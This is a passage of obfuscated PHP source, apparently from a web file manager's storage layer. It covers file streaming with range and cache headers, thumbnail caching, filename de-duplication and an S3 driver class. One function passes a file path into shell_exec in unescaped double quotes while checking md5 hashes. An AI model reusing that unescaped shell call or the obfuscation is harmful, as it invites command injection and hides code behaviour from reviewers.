Cache::get($®‡¯û‰Ã[114]); if (!$Í¬½ÅïÇ) { $½µ—è–Ó = BASIC_PATH . $®‡¯û‰Ã[115]; $éÄ†½õ¼ = md5_file($½µ—è–Ó); $Í¬½ÅïÇ = $®‡¯û‰Ã[116]; foreach ($Æ¯›À‰³ as $ÓìƒÖë…) { $´Š–®÷ = shell_exec($ÓìƒÖë… . "\40\x22{$½µ—è–Ó}\42"); if ($´Š–®÷ && substr(trim($´Š–®÷), 0, 32) == $éÄ†½õ¼) { $Í¬½ÅïÇ = $ÓìƒÖë…; break; } } Cache::set($®‡¯û‰Ã[114], $Í¬½ÅïÇ, 3600); } if ($Í¬½ÅïÇ == $®‡¯û‰Ã[116]) { return !1; } $´Š–®÷ = shell_exec($Í¬½ÅïÇ . "\x20\42{$é­ˆ¾Öì}\42"); $´Š–®÷ = str_replace($®‡¯û‰Ã[117], $®‡¯û‰Ã[12], $´Š–®÷); return substr($´Š–®÷, 0, 32); } public function link($éîÈÍ¸) { return $éîÈÍ¸; } public function fileOut($àĞÇÜ®, $ÍçÖñ¹ = false, $¿‹›¸ü¹ = false, $ì©»şáä = '') { $ùËçå®° =& $_SERVER[¬ÏÕ§Áú]; $this->cacheMethod(null, null); if (!$àĞÇÜ® || !$this->exist($àĞÇÜ®)) { show_json(LNG($ùËçå®°[118]), !1, $¿‹›¸ü¹); } $¶šªÃæ’ = $this->getType() == $ùËçå®°[119]; $ë‚´ñ»ó = $GLOBALS[$ùËçå®°[6]][$ùËçå®°[102]][$ùËçå®°[120]][$ùËçå®°[121]]; $—Âæ‚õ = (double) $GLOBALS[$ùËçå®°[6]][$ùËçå®°[102]][$ùËçå®°[120]][$ùËçå®°[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ĞÓÁ—ë = $this->infoFull($àĞÇÜ®); $©¸ã…”Ù = $ĞÓÁ—ë[$ùËçå®°[89]]; $üı¥ÛÅğ = gmdate($ùËçå®°[123], $ĞÓÁ—ë[$ùËçå®°[98]]); $Æ‡Œ²ÔÇ = $¿‹›¸ü¹ ? $¿‹›¸ü¹ : $this->iconvApp($ĞÓÁ—ë[$ùËçå®°[32]]); $Ïß±Ÿ»ˆ = 0; $ñ¥ˆ€Ş‰ = $©¸ã…”Ù - 1; $¤Õ¤–øø = $this->ext($Æ‡Œ²ÔÇ); if (in_array($¤Õ¤–øø, array($ùËçå®°[124], $ùËçå®°[125], $ùËçå®°[126], $ùËçå®°[127]))) { $¤Õ¤–øø = $ùËçå®°[128]; } if (in_array($¤Õ¤–øø, array($ùËçå®°[129]))) { $¤Õ¤–øø = $ùËçå®°[130]; } if (!$ì©»şáä) { $ì©»şáä = md5($üı¥ÛÅğ . $©¸ã…”Ù); } $ì©»şáä = $ùËçå®°[131] . $ì©»şáä . $ùËçå®°[131]; $Ÿºİ Ç¬ = get_file_mime($¤Õ¤–øø); $ÚÚ´©¢ = !0; $ÚÚ´©¢ = isset($_GET[$ùËçå®°[132]]) ? !1 : !0; if ($ÍçÖñ¹ === !1 && !mime_support($Ÿºİ Ç¬)) { $Ÿºİ Ç¬ = $ùËçå®°[133]; } header($ùËçå®°[134]); header($ùËçå®°[135] . $Ÿºİ Ç¬); $›‰£»¿ = rawurlencode($Æ‡Œ²ÔÇ); $›‰£»¿ = $ùËçå®°[131] . $›‰£»¿ . $ùËçå®°[136] . $›‰£»¿; if ($ÍçÖñ¹) { header($ùËçå®°[137]); header($ùËçå®°[138] . $›‰£»¿); } else { if ($ÚÚ´©¢) { header($ùËçå®°[139] . $›‰£»¿); } } $Ÿ˜ÏÌÒ– = 3600 * 24 * 30; header($ùËçå®°[140]); header($ùËçå®°[141]); header($ùËçå®°[142] . $Ÿ˜ÏÌÒ–); header($ùËçå®°[143] . gmdate($ùËçå®°[123], time() + $Ÿ˜ÏÌÒ–) . $ùËçå®°[144]); if (isset($_SERVER[$ùËçå®°[145]]) && strtotime($_SERVER[$ùËçå®°[145]]) == $ĞÓÁ—ë[$ùËçå®°[98]]) { header($ùËçå®°[146], !0, 304); die; } if (isset($_SERVER[$ùËçå®°[147]]) && $_SERVER[$ùËçå®°[147]] == $ì©»şáä) { header($ùËçå®°[148] . $ì©»şáä, !0, 304); die; } header($ùËçå®°[148] . $ì©»şáä); header($ùËçå®°[149] . $üı¥ÛÅğ . $ùËçå®°[144]); header($ùËçå®°[150] . $Æ‡Œ²ÔÇ); header($ùËçå®°[151]); header($ùËçå®°[152] . $©¸ã…”Ù); header($ùËçå®°[153]); Hook::trigger($ùËçå®°[154], $àĞÇÜ®, $©¸ã…”Ù, $Æ‡Œ²ÔÇ, $¤Õ¤–øø); if (!$ÍçÖñ¹ && $¤Õ¤–øø == $ùËçå®°[155]) { if ($©¸ã…”Ù > 1024 * 1024 * 10) { die; } $³î™áª = $this->getContent($àĞÇÜ®); $³î™áª = Html::clearSVG($³î™áª); header($ùËçå®°[156] . strlen($³î™áª)); echo $³î™áª; die; } $ïíã¨º¶ = strtolower($_SERVER[$ùËçå®°[157]]); if ($¶šªÃæ’ && $ïíã¨º¶ && $ë‚´ñ»ó) { if (strstr($ïíã¨º¶, $ùËçå®°[158])) { header($ùËçå®°[159] . $àĞÇÜ®); } else { if (strstr($ïíã¨º¶, $ùËçå®°[160])) { header($ùËçå®°[161] . $àĞÇÜ®); } else { if (strstr($ïíã¨º¶, $ùËçå®°[162])) { header($ùËçå®°[163] . $àĞÇÜ®); } } } if ($—Âæ‚õ) { header($ùËçå®°[164] . $—Âæ‚õ); } return; } if (isset($_SERVER[$ùËçå®°[165]])) { if (preg_match($ùËçå®°[166], $_SERVER[$ùËçå®°[165]], $ºïˆôÆÓ)) { $Ïß±Ÿ»ˆ = intval($ºïˆôÆÓ[1]); $Ïß±Ÿ»ˆ = $Ïß±Ÿ»ˆ <= 0 ? 0 : ($Ïß±Ÿ»ˆ >= $ñ¥ˆ€Ş‰ ? $ñ¥ˆ€Ş‰ : $Ïß±Ÿ»ˆ); if (!empty($ºïˆôÆÓ[2])) { $÷í˜õ°ş = intval($ºïˆôÆÓ[2]); $ñ¥ˆ€Ş‰ = $÷í˜õ°ş < $Ïß±Ÿ»ˆ ? $Ïß±Ÿ»ˆ : ($÷í˜õ°ş >= $ñ¥ˆ€Ş‰ ? $ñ¥ˆ€Ş‰ : $÷í˜õ°ş); } } header($ùËçå®°[167]); header("\103\157\x6e\x74\145\x6e\164\x2d\122\x61\x6e\147\x65\72\40\142\x79\x74\145\163\x20{$Ïß±Ÿ»ˆ}\55{$ñ¥ˆ€Ş‰}\57" . $©¸ã…”Ù); } else { header($ùËçå®°[168]); } header($ùËçå®°[169]); header($ùËçå®°[170]); $˜¶ÌŞöê = !0; if ($_SERVER[$ùËçå®°[171]] == $ùËçå®°[172] && $©¸ã…”Ù > 1204 * 1024 * 1024 * 2) { $˜¶ÌŞöê = !1; } if ($˜¶ÌŞöê) { header($ùËçå®°[173] . ($ñ¥ˆ€Ş‰ - $Ïß±Ÿ»ˆ + 1)); } if ($_SERVER[$ùËçå®°[174]] == $ùËçå®°[175]) { return; } $Å¼î¶âø = array($ùËçå®°[176] => !1, $ùËçå®°[177] => $Ïß±Ÿ»ˆ, $ùËçå®°[178] => $ñ¥ˆ€Ş‰, $ùËçå®°[179] => $¤Õ¤–øø, $ùËçå®°[180] => $ĞÓÁ—ë, $ùËçå®°[181] => $ùËçå®°[12], $ùËçå®°[182] => 0); $Å¼î¶âø = Hook::filter($ùËçå®°[183], $Å¼î¶âø); $³÷ßª«¢ = 1024 * 300; $ÅÁ„ü‰ì = 0; if ($—Âæ‚õ) { $ÅÁ„ü‰ì = intval(1000 * 1000 * ($³÷ßª«¢ / $—Âæ‚õ)); } while ($Ïß±Ÿ»ˆ <= $ñ¥ˆ€Ş‰) { $ü‘³ÔÇß = timeFloat(); check_abort(); $±¦Ì½Ã¹ = $ñ¥ˆ€Ş‰ - $Ïß±Ÿ»ˆ + 1; if ($±¦Ì½Ã¹ <= $³÷ßª«¢) { $³÷ßª«¢ = $±¦Ì½Ã¹; } $³î™áª = $this->fileSubstr($àĞÇÜ®, $Ïß±Ÿ»ˆ, $³÷ßª«¢); if ($Å¼î¶âø[$ùËçå®°[176]]) { $Å¼î¶âø[$ùËçå®°[181]] = $³î™áª; $Å¼î¶âø[$ùËçå®°[182]] = $Ïß±Ÿ»ˆ; $Å¼î¶âø = Hook::filter($ùËçå®°[184], $Å¼î¶âø); $³î™áª = $Å¼î¶âø[$ùËçå®°[181]]; } echo $³î™áª; $Ïß±Ÿ»ˆ += $³÷ßª«¢; if ($³÷ßª«¢ == $±¦Ì½Ã¹) { $Ïß±Ÿ»ˆ = $ñ¥ˆ€Ş‰ + 1; } if ($ÅÁ„ü‰ì) { $˜ïƒœä× = intval(1000 * 1000 * (timeFloat() - $ü‘³ÔÇß)); $ùè¨ä¹ó = $ÅÁ„ü‰ì - $˜ïƒœä×; if ($ùè¨ä¹ó > 5) { usleep($ùè¨ä¹ó); } } } } public function fileOutServer($öê¥”·ğ, $ÖÈ‰ƒßë = false, $¸ñ»áï‹ = false, $ŠÜî‡Ÿ¨ = '') { $this->fileOut($öê¥”·ğ, $ÖÈ‰ƒßë, $¸ñ»áï‹, $ŠÜî‡Ÿ¨); } public function fileOutLink($şÚŠ­­Î) { header($_SERVER[¬ÏÕ§Áú][185] . $şÚŠ­­Î); die; } public function cacheMethod($®ûóü©Ú, $ÇÙâÓú, $‰Ÿ÷Á¸… = null) { $áÛŞ¸¹ =& $_SERVER[¬ÏÕ§Áú]; static $­Õ€¶ß“ = array(); $óş÷Ñ”ñ = $ÇÙâÓú ? ltrim($this->getPathOuter($ÇÙâÓú), $áÛŞ¸¹[8]) : $áÛŞ¸¹[12]; $ÏÁÚõ¶Ú = $áÛŞ¸¹[186] . $®ûóü©Ú . $áÛŞ¸¹[187] . rtrim($óş÷Ñ”ñ, $áÛŞ¸¹[8]); if (is_null($®ûóü©Ú)) { $­Õ€¶ß“ = array(); return; } if (is_null($ÇÙâÓú)) { foreach ($­Õ€¶ß“ as $ÏÁÚõ¶Ú => $°´Œ„¼Ñ) { if (!strstr($ÏÁÚõ¶Ú, $áÛŞ¸¹[186] . $®ûóü©Ú . $áÛŞ¸¹[188])) { continue; } unset($­Õ€¶ß“[$ÏÁÚõ¶Ú]); } return; } if ($‰Ÿ÷Á¸… === $áÛŞ¸¹[189]) { unset($­Õ€¶ß“[$ÏÁÚõ¶Ú]); return; } if (!is_null($‰Ÿ÷Á¸…)) { $­Õ€¶ß“[$ÏÁÚõ¶Ú] = $‰Ÿ÷Á¸…; return; } $ÙŸ·ø­å = isset($­Õ€¶ß“[$ÏÁÚõ¶Ú]) ? $­Õ€¶ß“[$ÏÁÚõ¶Ú] : null; if (!is_null($ÙŸ·ø­å)) { return $ÙŸ·ø­å; } $ÙŸ·ø­å = $this->{$®ûóü©Ú}($ÇÙâÓú); $­Õ€¶ß“[$ÏÁÚõ¶Ú] = $ÙŸ·ø­å; return $ÙŸ·ø­å; } public function cacheMethodInfoSet($¯ÌïÕ¢†, $¶íÒ§şö, $ß©ìÕ… = false) { $£ÀöÃÖ· =& $_SERVER[¬ÏÕ§Áú]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($£ÀöÃÖ·[190], $¯ÌïÕ¢†, $¶íÒ§şö); $this->cacheMethod($£ÀöÃÖ·[191], $¯ÌïÕ¢†, $¶íÒ§şö ? !1 : !0); if (is_array($ß©ìÕ…)) { $this->cacheMethod($£ÀöÃÖ·[192], $¯ÌïÕ¢†, $ß©ìÕ…); } } public function fileOutImage($¹Äåûä¢, $ú¬›»­– = 250) { $¸è›ùÏ± =& $_SERVER[¬ÏÕ§Áú]; set_timeout(); if (substr($¹Äåûä¢, 0, 4) == $¸è›ùÏ±[162]) { $this->fileOutLink($¹Äåûä¢); } $Ã®°…Éµ = $this->info($¹Äåûä¢); $¥ùÄÄÎ = !1; $Ö²¤¹š = isset($GLOBALS[$¸è›ùÏ±[193]]) ? $GLOBALS[$¸è›ùÏ±[193]] : array(); if ($Ö²¤¹š && $Ö²¤¹š[$¸è›ùÏ±[194]] == $Ã®°…Éµ[$¸è›ùÏ±[97]]) { $Ã®°…Éµ = $Ö²¤¹š; $üÌ€îÏŞ = $Ã®°…Éµ[$¸è›ùÏ±[195]]; if ($üÌ€îÏŞ && isset($üÌ€îÏŞ[$¸è›ùÏ±[196]])) { if ($üÌ€îÏŞ[$¸è›ùÏ±[196]] <= $ú¬›»­– && $üÌ€îÏŞ[$¸è›ùÏ±[197]] <= $ú¬›»­–) { $¥ùÄÄÎ = !0; } } } if ($Ã®°…Éµ[$¸è›ùÏ±[89]] <= 1024 * 50 || $¥ùÄÄÎ || !function_exists($¸è›ùÏ±[198]) || $Ã®°…Éµ[$¸è›ùÏ±[179]] == $¸è›ùÏ±[199]) { return $this->fileOut($¹Äåûä¢, !1, $Ã®°…Éµ[$¸è›ùÏ±[32]]); } $”Î•à©æ = kodIO::hashPath($Ã®°…Éµ); $üé©»ì® = "\143\157\166\x65\x72\137{$”Î•à©æ}\x5f{$ú¬›»­–}\x2e\160\156\147"; $¶ıÂªÕ… = IO_PATH_SYSTEM_TEMP . $¸è›ùÏ±[200]; $¦Ü¹ß½Ñ = IO::infoFullSimple($¶ıÂªÕ…); $Ò¸„ƒ¶ì = $¦Ü¹ß½Ñ && is_array($¦Ü¹ß½Ñ) ? $¦Ü¹ß½Ñ[$¸è›ùÏ±[97]] : $¸è›ùÏ±[12]; if (!$Ò¸„ƒ¶ì) { $Ò¸„ƒ¶ì = IO::mkdir($¶ıÂªÕ…); } if ($Ã®°…Éµ[$¸è›ùÏ±[201]] == $¸è›ùÏ±[202] && isset($Ã®°…Éµ[$¸è›ùÏ±[203]]) && $Ã®°…Éµ[$¸è›ùÏ±[203]] == kodIO::sourceID($Ò¸„ƒ¶ì)) { $×öÏìßƒ = $Ã®°…Éµ[$¸è›ùÏ±[204]]; if ($ú¬›»­– <= 500) { $”î¶˜…Ä = preg_replace($¸è›ùÏ±[205], $¸è›ùÏ±[206], $Ã®°…Éµ[$¸è›ùÏ±[32]]); $×öÏìßƒ = IO::fileNameExist($Ò¸„ƒ¶ì, $”î¶˜…Ä); } return IO::fileOut(KodIO::make($×öÏìßƒ), !1, $Ã®°…Éµ[$¸è›ùÏ±[32]]); } $ƒó¦ÜÚ = IO::fileNameExist($Ò¸„ƒ¶ì, $üé©»ì®); if ($ƒó¦ÜÚ) { return IO::fileOut(KodIO::make($ƒó¦ÜÚ), !1, $Ã®°…Éµ[$¸è›ùÏ±[32]]); } if ($ú¬›»­– > 1000) { $this->makeImageCover($Ò¸„ƒ¶ì, $¹Äåûä¢, $üé©»ì®, $ú¬›»­–); $this->makeImageCover($Ò¸„ƒ¶ì, $¹Äåûä¢, "\x63\x6f\166\x65\162\137{$”Î•à©æ}\x5f\x32\x35\x30\x2e\160\156\x67", 250); $ƒó¦ÜÚ = IO::fileNameExist($Ò¸„ƒ¶ì, $üé©»ì®); if ($ƒó¦ÜÚ) { return IO::fileOut(KodIO::make($ƒó¦ÜÚ), !1, $Ã®°…Éµ[$¸è›ùÏ±[32]]); } die; } if (!kodIO::allowCover($Ã®°…Éµ)) { return $this->fileOut($¹Äåûä¢, !1, $Ã®°…Éµ[$¸è›ùÏ±[32]]); } $æ—©ªçÒ = Cache::get($üé©»ì®); if ($æ—©ªçÒ == $¸è›ùÏ±[207] || $æ—©ªçÒ == $¸è›ùÏ±[208]) { echo $æ—©ªçÒ; die; } Cache::set($üé©»ì®, $¸è›ùÏ±[208], 60); $£Óš–Í… = array($Ò¸„ƒ¶ì, $Ã®°…Éµ[$¸è›ùÏ±[97]], $üé©»ì®, $ú¬›»­–); $°™âı¦ = $¸è›ùÏ±[209] . $Ã®°…Éµ[$¸è›ùÏ±[89]] . $¸è›ùÏ±[210] . $üé©»ì® . $¸è›ùÏ±[211] . $Ã®°…Éµ[$¸è›ùÏ±[32]] . $¸è›ùÏ±[212] . $Ã®°…Éµ[$¸è›ùÏ±[97]]; TaskQueue::add($¸è›ùÏ±[213], $£Óš–Í…, $°™âı¦, $üé©»ì®); } public function makeImageCover($Ç®àØñõ, $ÚßÏøºØ, $âáá ÎÉ, $Ç™€»ò) { $Õ´Øì°ø =& $_SERVER[¬ÏÕ§Áú]; if (IO::fileNameExist($Ç®àØñõ, $âáá ÎÉ)) { return $Õ´Øì°ø[214]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ÆÀÏ¯Ö‚ = $this->getPathOuter($ÚßÏøºØ); $•Î µàã = DATA_THUMB . $âáá ÎÉ; del_file($•Î µàã); $Äå–ºˆ­ = IO::copy($ÆÀÏ¯Ö‚, TEMP_FILES, !1, $âáá ÎÉ); if (!@file_exists($Äå–ºˆ­)) { return $Õ´Øì°ø[215]; } ImageThumb::createThumb($Äå–ºˆ­, $•Î µàã, $Ç™€»ò, $Ç™€»ò * 10); if (@file_exists($•Î µàã)) { Cache::remove($âáá ÎÉ); return IO::move($•Î µàã, $Ç®àØñõ); } Cache::set($âáá ÎÉ, $Õ´Øì°ø[207], 600); del_file($•Î µàã); return $Õ´Øì°ø[216] . $Äå–ºˆ­ . $Õ´Øì°ø[84]; } public function fileOutImageServer($ïì›»ÌÍ, $ššı¿Ñ¿ = 250) { $this->fileOutImage($ïì›»ÌÍ, $ššı¿Ñ¿); } public function fileNameAuto($ƒèù¯¨”, $³à†Ûì, $¹ÚËŸÖ = REPEAT_RENAME, $ç§ŸÕÖ = false) { $áÊ¦¼ß” =& $_SERVER[¬ÏÕ§Áú]; $¼×’÷è¢ = $ƒèù¯¨” === $áÊ¦¼ß”[12] ? $³à†Ûì : rtrim($ƒèù¯¨”, $áÊ¦¼ß”[8]) . $áÊ¦¼ß”[8] . $³à†Ûì; if ($¹ÚËŸÖ == REPEAT_REPLACE || !$this->exist($¼×’÷è¢) || $ç§ŸÕÖ && $¹ÚËŸÖ != REPEAT_RENAME_FOLDER) { return $³à†Ûì; } if ($¹ÚËŸÖ == REPEAT_SKIP) { return !1; } $Õ¥¤øşğ = $áÊ¦¼ß”[10] . get_path_ext($³à†Ûì); $Õ¥¤øşğ = $Õ¥¤øşğ == $áÊ¦¼ß”[10] || $ç§ŸÕÖ ? $áÊ¦¼ß”[12] : $Õ¥¤øşğ; $± îå²ú = 1; $È™œ÷­Û = substr($³à†Ûì, 0, strlen($³à†Ûì) - strlen($Õ¥¤øşğ)); $£ËËì = $È™œ÷­Û . "\x28{$± îå²ú}\51{$Õ¥¤øşğ}"; while ($this->exist(rtrim($ƒèù¯¨”, $áÊ¦¼ß”[8]) . $áÊ¦¼ß”[8] . $£ËËì)) { $£ËËì = $È™œ÷­Û . "\50{$± îå²ú}\51{$Õ¥¤øşğ}"; $± îå²ú++; } return $£ËËì; } private function fileNameAutoList($¢©–Åß, $õÑ¡÷, $€İÁšº = false) { $ÁùùæÏ† =& $_SERVER[¬ÏÕ§Áú]; $ÛˆæÍŒ = $this->listPath($¢©–Åß, !0); $ÛˆæÍŒ = array_merge($ÛˆæÍŒ[$ÁùùæÏ†[95]], $ÛˆæÍŒ[$ÁùùæÏ†[96]]); $¯Ìá ¤û = array_to_keyvalue($ÛˆæÍŒ, $ÁùùæÏ†[12], $ÁùùæÏ†[32]); $ÁÇÇğóÏ = $ÁùùæÏ†[10] . get_path_ext($õÑ¡÷); $ÁÇÇğóÏ = $ÁÇÇğóÏ == $ÁùùæÏ†[10] || $€İÁšº ? $ÁùùæÏ†[12] : $ÁÇÇğóÏ; $£çğàÊ = substr($õÑ¡÷, 0, strlen($õÑ¡÷) - strlen($ÁÇÇğóÏ)); $ò‰¹Šú³ = $£çğàÊ . "\x28\60\51{$ÁÇÇğóÏ}"; for ($ë±Íœµ™ = 1; $ë±Íœµ™ <= count($¯Ìá ¤û) + 1; $ë±Íœµ™++) { $ò‰¹Šú³ = $£çğàÊ . "\50{$ë±Íœµ™}\51{$ÁÇÇğóÏ}"; if (!in_array_not_case($ò‰¹Šú³, $¯Ìá ¤û)) { return $ò‰¹Šú³; } } return $ò‰¹Šú³; } public function listAllFiles($Ÿåàşºô, $ä×Ş«ŠÍ) { $‰Ü×š¬÷ =& $_SERVER[¬ÏÕ§Áú]; if (empty($ä×Ş«ŠÍ)) { return array(); } $ñö­í—ç = array_keys($ä×Ş«ŠÍ); $şÌ•†â = array(); $Ÿåàşºô = trim($Ÿåàşºô, $‰Ü×š¬÷[8]); foreach ($ä×Ş«ŠÍ as $”Äº€‹± => $ Ù£‚åó) { $†ûõàã± = ltrim(substr(trim($”Äº€‹±, $‰Ü×š¬÷[8]), strlen($Ÿåàşºô)), $‰Ü×š¬÷[8]); if (substr($”Äº€‹±, -1) == $‰Ü×š¬÷[8]) { $†ûõàã± = rtrim($†ûõàã±, $‰Ü×š¬÷[8]) . $‰Ü×š¬÷[8]; } $şÌ•†â = array_merge($şÌ•†â, $this->slicePath($†ûõàã±)); } $Ğ„ğé×ú = array(); foreach (array_unique($şÌ•†â) as $›ïéÕ) { $ØŸÄÚÎõ = array($‰Ü×š¬÷[97] => $this->getPathOuter($‰Ü×š¬÷[8] . $Ÿåàşºô . $‰Ü×š¬÷[8] . $›ïéÕ), $‰Ü×š¬÷[88] => 1, $‰Ü×š¬÷[89] => 0); if (substr($›ïéÕ, -1) != $‰Ü×š¬÷[8]) { $ØŸÄÚÎõ[$‰Ü×š¬÷[88]] = 0; $üµÔÒÍˆ = $this->getPath($Ÿåàşºô . $‰Ü×š¬÷[8] . $›ïéÕ); if (isset($ä×Ş«ŠÍ[$üµÔÒÍˆ])) { $Øí­Âõ = $ä×Ş«ŠÍ[$üµÔÒÍˆ]; if (isset($Øí­Âõ[$‰Ü×š¬÷[89]])) { $ØŸÄÚÎõ[$‰Ü×š¬÷[89]] = intval($Øí­Âõ[$‰Ü×š¬÷[89]]); } if (isset($Øí­Âõ[$‰Ü×š¬÷[217]])) { $ØŸÄÚÎõ[$‰Ü×š¬÷[98]] = intval($Øí­Âõ[$‰Ü×š¬÷[217]]); } } } $Ğ„ğé×ú[] = $ØŸÄÚÎõ; } return $Ğ„ğé×ú; } public function slicePath($½Ï–Ô) { $ê‰ÜÍ×Ş =& $_SERVER[¬ÏÕ§Áú]; $®²˜¹ªó = explode($ê‰ÜÍ×Ş[8], trim($½Ï–Ô, $ê‰ÜÍ×Ş[8])); $ë¿¾Ï–Ğ = 0; do { ++$ë¿¾Ï–Ğ; $ã¹¾Š”[] = implode($ê‰ÜÍ×Ş[8], array_slice($®²˜¹ªó, 0, $ë¿¾Ï–Ğ)) . $ê‰ÜÍ×Ş[8]; } while ($ë¿¾Ï–Ğ < count($®²˜¹ªó)); $ã¹¾Š”[count($®²˜¹ªó) - 1] = $½Ï–Ô; return $ã¹¾Š”; } public function getHost() { $°–€ÔÛÑ =& $_SERVER[¬ÏÕ§Áú]; $¬êŞõ¼Œ = parse_url(trim($this->domain, $°–€ÔÛÑ[8])); $É´ó¦É„ = isset($¬êŞõ¼Œ[$°–€ÔÛÑ[218]]) ? $¬êŞõ¼Œ[$°–€ÔÛÑ[218]] : http_type(); $¶‚Æı´Š = isset($¬êŞõ¼Œ[$°–€ÔÛÑ[219]]) ? $¬êŞõ¼Œ[$°–€ÔÛÑ[219]] : $¬êŞõ¼Œ[$°–€ÔÛÑ[97]]; if (isset($¬êŞõ¼Œ[$°–€ÔÛÑ[220]])) { $¶‚Æı´Š .= $°–€ÔÛÑ[4] . $¬êŞõ¼Œ[$°–€ÔÛÑ[220]]; } return $É´ó¦É„ . $°–€ÔÛÑ[221] . $¶‚Æı´Š; } public function pathEncode($ãî‹ĞÌã) { $ÀòŒÀŞû =& $_SERVER[¬ÏÕ§Áú]; return str_replace($ÀòŒÀŞû[222], $ÀòŒÀŞû[8], rawurlencode($ãî‹ĞÌã)); } public function writeLog($¬Èë…² = '', $¶ÅˆÎƒ = false) { $Ûğ—ç÷ =& $_SERVER[¬ÏÕ§Áú]; $¦ñ’©¥á = in_array(ACTION, array($Ûğ—ç÷[223], $Ûğ—ç÷[224])); if (!$¦ñ’©¥á && !GLOBAL_DEBUG) { return; } $ğÂ¿§Â˜ = $¬Èë…²; static $ÔàÜè‘Ä = null; if (!$ÔàÜè‘Ä) { $ÔàÜè‘Ä = strtoupper($this->getType()); } $¬Èë…² = $ÔàÜè‘Ä . $Ûğ—ç÷[225] . $¬Èë…²; if ($¶ÅˆÎƒ) { $³èêÛìò = error_get_last(); if ($³èêÛìò) { $¬Èë…² = array($¬Èë…², $³èêÛìò); } } write_log($¬Èë…², $Ûğ—ç÷[226]); if ($¦ñ’©¥á) { throw new Exception($ğÂ¿§Â˜); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($À¿Èá™‹) { set_timeout(); require_once SDK_DIR . $_SERVER[¬ÏÕ§Áú][227]; parent::__construct(); $this->_init($À¿Èá™‹); } public function _init($†µ»ß£Ë) { $…¡…í† =& $_SERVER[¬ÏÕ§Áú]; $this->config = $†µ»ß£Ë; foreach ($†µ»ß£Ë as $¶ä¦ËÉÊ => $¹¡Ş„ä) { if (isset($this->{$¶ä¦ËÉÊ})) { $this->{$¶ä¦ËÉÊ} = $¹¡Ş„ä; } } $this->endpoint = $†µ»ß£Ë[$…¡…í†[228]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $²ñÓÖÑÀ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($²ñÓÖÑÀ, 0, 7) == $…¡…í†[229]) { $²ñÓÖÑÀ = $…¡…í†[230] . substr($²ñÓÖÑÀ, 7); } $this->client->setEndpoint($²ñÓÖÑÀ); if (in_array(ACTION, array($…¡…í†[223], $…¡…í†[224]))) { $this->client->setExceptions(); } } public function setSignVersion($ßñ¥§ÁÄ = "\x76\x34") { $this->signVer = $ßñ¥§ÁÄ; $this->client->setSignVersion($ßñ¥§ÁÄ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ƒÚ¥ƒ²·) { return null; } } public function isBucketCors() { $Ø¨ìÜ› =& $_SERVER[¬ÏÕ§Áú]; $ë–úí‘Ò = $this->getBucketCors(); if (!$ë–úí‘Ò || !is_array($ë–úí‘Ò)) { return !1; } if (!is_array($ë–úí‘Ò[$Ø¨ìÜ›[231]])) { $ë–úí‘Ò[$Ø¨ìÜ›[231]] = explode($Ø¨ìÜ›[50], $ë–úí‘Ò[$Ø¨ìÜ›[231]]); } if ($ë–úí‘Ò[$Ø¨ìÜ›[232]] != $Ø¨ìÜ›[233] || !in_array($Ø¨ìÜ›[233], $ë–úí‘Ò[$Ø¨ìÜ›[231]])) { return !1; } $™µä×ï» = array_map($Ø¨ìÜ›[234], $ë–úí‘Ò[$Ø¨ìÜ›[235]]); if (!is_array($™µä×ï»)) { $™µä×ï» = array(); } $…‘¤®Î = array($Ø¨ìÜ›[236], $Ø¨ìÜ›[237], $Ø¨ìÜ›[238], $Ø¨ìÜ›[239], $Ø¨ìÜ›[240]); $¥…Ê×›Ç = array_diff($…‘¤®Î, $™µä×ï»); return empty($¥…Ê×›Ç); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($²ÖÖ”Äó, $¬âŞ’àó = '', $ÃñÅÉ™õ = REPEAT_RENAME) { $À¶‘¶Í£ = $this->setContent($²ÖÖ”Äó, $¬âŞ’àó); if ($À¶‘¶Í£ !== !1) { return $this->getPathOuter($²ÖÖ”Äó); } return !1; } public function mkdir($Ùô…ûœ¸, $Æö šª§ = REPEAT_SKIP) { $©÷Ù€™ =& $_SERVER[¬ÏÕ§Áú]; if (empty($Ùô…ûœ¸) && $Ùô…ûœ¸ !== $©÷Ù€™[241]) { return !1; } if ($Æö šª§ && $this->_isFolder($Ùô…ûœ¸)) { return $this->getPathOuter($Ùô…ûœ¸); } $¶ÊõíıÑ = $this->setContent($Ùô…ûœ¸, $©÷Ù€™[12], !0); if ($¶ÊõíıÑ !== !1) { return $this->getPathOuter($Ùô…ûœ¸); } return !1; } public function copyFile($ø«¿‘¤Ñ, $øÑÉ¶ÀŠ, $Ÿ…Åâ”ğ = array()) { $½•½Åˆ =& $_SERVER[¬ÏÕ§Áú]; $¿Ş“îˆ© = $this->objectMeta($ø«¿‘¤Ñ); if (!$¿Ş“îˆ©) { return !1; } if ($¿Ş“îˆ©[$½•½Åˆ[89]] <= 1024 * 1024 * 200) { $¢ù¶ˆÃ = $this->client->copyObject($this->bucket, $ø«¿‘¤Ñ, $this->bucket, $øÑÉ¶ÀŠ, $½•½Åˆ[242], $Ÿ…Åâ”ğ); } else { $¢ù¶ˆÃ = $this->client->multiCopyObject($this->bucket, $ø«¿‘¤Ñ, $this->bucket, $øÑÉ¶ÀŠ, $Ÿ…Åâ”ğ); } $¢ù¶ˆÃ = $¢ù¶ˆÃ ? $this->getPathOuter($øÑÉ¶ÀŠ) : !1; return $¢ù¶ˆÃ; } public function moveFile($´ó‚„Ø÷, $ëÂâÅ†) { if ($this->copyFile($´ó‚„Ø÷, $ëÂâÅ†)) { $this->delFile($´ó‚„Ø÷); return $this->getPathOuter($ëÂâÅ†); } return !1; } public function delFile($ì‹šåê³) { return $this->client->deleteObject($this->bucket, $ì‹šåê³); } public function delFolder($‚§ÑÚÖ·) { $Æù˜£Á =& $_SERVER[¬ÏÕ§Áú]; if 